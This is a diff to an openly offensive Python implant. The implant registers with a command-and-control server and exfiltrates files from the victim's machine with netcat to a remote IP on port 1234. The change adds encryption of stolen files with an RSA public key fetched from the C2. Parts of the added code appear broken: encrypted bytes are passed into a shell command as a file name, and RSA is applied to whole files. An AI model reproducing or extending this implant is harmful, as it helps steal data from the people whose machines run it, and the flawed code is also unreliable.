@@ -5,6 +5,12 @@ import time
 import subprocess
 import sys
 
+import cryptography
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+
 #Comms
 implantDir = os.getcwd()
 
@@ -12,6 +18,28 @@ implantDir = os.getcwd()
 def ExfilFile(file, c2, IPAddress):
     filename = file.rsplit('/', 1)[-1]
     urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={filename}')
+
+    f = open(f'{file}', 'rb')
+    message = f.read()
+    f.close()
+
+    print(message)
+
+    with open(f"{implantDir}/public_key.pem", "rb") as key_file:
+        public_key = serialization.load_pem_public_key(
+            key_file.read(),
+            backend=default_backend()
+    )
+
+    file = public_key.encrypt(
+        message,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+    )
+)
+
     os.system(f'nc -q1 -w5 {IPAddress} 1234 < {file}')
     return
 
@@ -89,8 +117,13 @@ if(os.path.isfile("sid.log")):
 else:
     dir = urllib.parse.quote_plus(os.getcwd())
     sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
+    publicKey = urllib.request.urlopen(f'{c2}/publicKey').read().decode("utf-8")
     f = open("sid.log", "w")
     f.write(sid)
+    f.close()
+
+    f = open("public_key.pem", "w")
+    f.write(publicKey)
     f.close()
 
 while True:
